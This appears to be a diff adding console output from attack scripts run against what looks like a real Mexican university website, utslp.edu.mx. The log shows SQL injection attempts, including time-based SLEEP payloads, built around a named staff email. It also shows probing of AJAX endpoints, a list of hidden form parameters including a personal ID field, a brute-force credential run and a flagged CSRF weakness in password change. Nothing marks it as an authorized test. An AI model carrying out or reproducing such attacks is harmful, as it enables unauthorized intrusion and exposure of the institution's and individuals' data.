@@ -1,0 +1,115 @@
+Script de Explotación Basada en los Hallazgos:
+
+=== EXPLOTACIÓN DIRIGIDA ===
+[*] Explotando con patrón de email hnieto@utslp.edu.mx...
+[!] ¡Email hnieto encontrado en respuesta!
+[!] Dominio utslp.edu.mx referenciado
+[!] ¡Email hnieto encontrado en respuesta!
+[!] Dominio utslp.edu.mx referenciado
+[+] Respuesta guardada en email_exploit_hnieto.html
+[!] ¡Email hnieto encontrado en respuesta!
+[!] Dominio utslp.edu.mx referenciado
+[+] Respuesta guardada en email_exploit_hnieto' OR.html
+[!] ¡Email hnieto encontrado en respuesta!
+[!] Dominio utslp.edu.mx referenciado
+[+] Respuesta guardada en email_exploit_admin@utsl.html
+[!] ¡Email hnieto encontrado en respuesta!
+[!] Dominio utslp.edu.mx referenciado
+[+] Respuesta guardada en email_exploit_administra.html
+
+[*] Usando técnicas basadas en tiempo...
+[-] No delay con: admin' AND SLEEP(5)--
+[-] No delay con: admin' UNION SELECT SLEEP(5),2,3--
+[-] No delay con: hnieto' AND SLEEP(5)--
+
+[*] Explotando endpoints AJAX...
+[+] AJAX endpoint accesible: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp
+    Respuesta:
+
+
+1¬INSTITUTO OCTAVIO PAZ...
+[+] AJAX endpoint accesible: /jsp/escolar/muestra_bachillerato_ajax.jsp
+    Respuesta:
+
+
+1,INSTITUTO OCTAVIO PAZ...
+
+[*] Buscando parámetros ocultos...
+[+] Parámetros ocultos encontrados:
+    - data
+    - vWinPres
+    - xmlhttp1
+    - bachillerato
+    - dom
+    - domicilio
+    - yColonia
+    - domicilio_corto
+    - yEstado22
+    - cve_bachillerato
+    - yInteresado
+    - nombre_bachillerato
+    - cve_colonia
+    - yBachillerato
+    - xmlhttp
+    - ySexo
+    - yUt
+    - yColoniaP
+    - yResolucion
+    - yObjeto
+    - filtro
+    - menor_edad
+    - fecha2
+    - servicio
+    - fecha
+    - iconoInfo
+    - yIntentos
+    - cual_otro
+    - app
+    - checado
+    - yEstado
+    - yScroll
+    - pagina
+    - apm
+    - ventana
+    - sexo
+    - nombre
+    - opcion2
+    - yCiudad22
+    - seleccionado
+    - imagen
+    - yUsuario
+    - anioInicio
+    - yAlumnoTSU
+    - yMenorEdad
+    - yCveTipoSeguroOtro
+    - cup
+    - yAccion
+    - anioFin
+    *** seleccion_escolaridad
+    - i
+    - yCiudad
+    - opcion
+    - curp
+    - yUbicar
+    - yBloqueoG
+    - tipo_otro
+    - yEncuestado
+
+Script de Fuerza Bruta con Dominio UTSLP:
+
+=== FUERZA BRUTA UTSLP ===
+[*] Iniciando fuerza bruta UTSLP...
+[*] Generando credenciales UTSLP...
+[-] No se encontraron credenciales válidas
+
+Script de Análisis de Vulnerabilidades Específicas:
+
+=== ESCANEO DE VULNERABILIDADES ===
+[*] Probando vulnerabilidades comunes...
+
+[*] Probando vulnerabilidad CSRF...
+[!] Posible vulnerabilidad CSRF en cambio de contraseña
+
+[*] Probando subida de archivos...
+
+[*] Buscando información de depuración...
